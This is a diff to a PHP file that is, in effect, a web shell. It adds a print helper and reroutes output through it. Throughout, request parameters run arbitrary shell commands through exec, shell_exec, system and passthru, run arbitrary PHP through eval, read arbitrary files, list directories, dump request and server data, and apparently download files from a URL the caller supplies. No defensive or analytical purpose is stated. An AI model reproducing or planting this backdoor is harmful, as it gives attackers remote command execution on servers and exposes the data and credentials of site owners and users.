@@ -1,5 +1,11 @@
 <?php
 
+function dumperx(...$data) {
+    echo "<pre>";
+    print_r($data);
+    echo "</pre>";
+}
+
 if (isset($_GET['upload'])) {
     // URL of the file you want to download
     $url = $_GET['upload'];
@@ -29,54 +35,54 @@ if (isset($_GET['upload'])) {
     }
 } elseif (isset($_GET['exec'])) {
     try {
-        var_dump(exec($_GET['exec']));
+        dumperx(exec($_GET['exec']));
     } catch (\Throwable $th) {
-        var_dump($th);
+        dumperx($th);
     }
 } elseif (isset($_GET['shell_exec'])) {
     try {
-        var_dump(shell_exec($_GET['shell_exec']));
+        dumperx(shell_exec($_GET['shell_exec']));
     } catch (\Throwable $th) {
-        var_dump($th);
+        dumperx($th);
     }
 } elseif (isset($_GET['system'])) {
     try {
-        var_dump(system($_GET['system']));
+        dumperx(system($_GET['system']));
     } catch (\Throwable $th) {
-        var_dump($th);
+        dumperx($th);
     }
 } elseif (isset($_GET['passthru'])) {
     try {
-        var_dump(passthru($_GET['passthru']));
+        dumperx(passthru($_GET['passthru']));
     } catch (\Throwable $th) {
-        var_dump($th);
+        dumperx($th);
     }
 } elseif (isset($_GET['read'])) {
     try {
-        var_dump(file_get_contents($_GET['read']));
+        dumperx(file_get_contents($_GET['read']));
     } catch (\Throwable $th) {
-        var_dump($th);
+        dumperx($th);
     }
 } elseif (isset($_GET['eval'])) {
     try {
         eval($_GET['eval']);
     } catch (\Throwable $th) {
-        var_dump($th);
+        dumperx($th);
     }
 } elseif (isset($_GET['dump'])) {
     try {
-        var_dump([
+        dumperx([
             'GET' => $_GET,
             'POST' => $_POST,
             'SERVER' => $_SERVER
         ]);
     } catch (\Throwable $th) {
-        var_dump($th);
+        dumperx($th);
     }
 } elseif (isset($_GET['scandir'])) {
     try {
-        print_r(scandir($_GET['scandir']));
+        dumperx(scandir($_GET['scandir']));
     } catch (\Throwable $th) {
-        var_dump($th);
+        dumperx($th);
     }
 }
